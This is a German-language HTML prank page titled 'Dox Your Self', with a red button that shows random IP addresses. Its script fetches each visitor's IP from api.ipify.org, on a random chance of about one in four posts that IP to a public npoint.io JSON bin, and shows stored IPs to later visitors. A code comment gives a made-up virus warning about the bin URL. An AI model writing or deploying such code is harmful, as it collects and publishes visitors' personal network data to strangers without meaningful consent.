<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <title>Dox Your Self</title>
</head>
<body style="display: flex; flex-direction: column; justify-content: center; align-items: center; margin: 0; height: 100vh; background-color: #333; overflow: hidden;">
    <audio id="clickSound" src="click_sound.mp3" preload="auto"></audio>
    <p style="color: rgba(255,255,255,0.5); font-family: Arial; font-size: 2vmin; margin-bottom: 3vmin; letter-spacing: 0.2vmin;">
        Made by Ich (;
    </p>
    <div style="position: relative; width: 35vmin; aspect-ratio: 1/1; background-color: gray; border-radius: 15%; display: flex; justify-content: center; align-items: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
        
        <button id="mainBtn" style="
            background-color: red;
            width: 60%;
            border-radius: 50%;
            aspect-ratio: 1/1;
            box-shadow: 0 2vmin 0 0 #440101;
            transform: translateY(-1vmin);
            cursor: pointer;
            transition: all 0.1s;
            outline: none;
            border: 0.5vmin solid #1a0101;
        " 
        onmousedown="luck();" 
        onmouseup="resetBtn();">
        </button>
        <p id="infoText" style="position: absolute; bottom: -6vmin; width: 150%; text-align: center; margin: 0; color: white; font-family: Arial; font-weight: bold; font-size: 2.5vmin; text-transform: uppercase; white-space: nowrap;">
            Klick the button to get an IP
        </p>
    </div>

    <script>
        const BIN_URL = "https://api.npoint.io/38922edd89306a9512b4"; //Guys geht nich auf die adrese ihr bekommt dann virus vertraut
        const btn = document.getElementById('mainBtn');
        const info = document.getElementById('infoText');
        const sound = document.getElementById('clickSound');
        let userIP = "Loading...";
    
        async function fetchIP() {
                const response = await fetch('https://api.ipify.org');
                userIP = await response.text();
        }
        fetchIP();
    
        async function pullRandomName() {
                const response = await fetch(BIN_URL);
                const data = await response.json();
                const list = data.ips || ["No IPs yet"];
                const randomIndex = Math.floor(Math.random() * list.length);
                return list[randomIndex];
        }
    
        async function pushName(newIp) {
                const response = await fetch(BIN_URL);
                const data = await response.json();
                if (!data.ips) data.ips = [];
                if (!data.ips.includes(newIp)) {
                    data.ips.push(newIp);
                    await fetch(BIN_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                }
        }
    
        async function luck() {
            btn.style.transform = 'translateY(1vmin)';
            btn.style.boxShadow = '0 0 0 0 #440101';
            
            sound.currentTime = 0;
            sound.play().catch(() => {});
    
            let rand = Math.random();
    
            if (rand > 0.26) {
                info.innerText = "Lade Liste...";
                const cloudName = await pullRandomName();
                info.innerText = "Zufällige IP: " + cloudName;
                info.style.color = "white";
                info.style.textShadow = "none";
            } else {
                info.innerText = "DOXXED";
                info.style.color = "red";
                info.style.textShadow = "0 0 10px red";
                pushName(userIP);
                btn.disabled = true;
                btn.style.pointerEvents = "none";
                btn.style.transform = 'translateY(1vmin)';
                btn.style.boxShadow = 'inset 0 2vmin 0 0 #440101';
            }
        }
    
        function resetBtn() {
            if (!btn.disabled) {
                btn.style.transform = 'translateY(-1vmin)';
                btn.style.boxShadow = '0 2vmin 0 0 #440101';
            }
        }
    </script>    
</body>
</html>
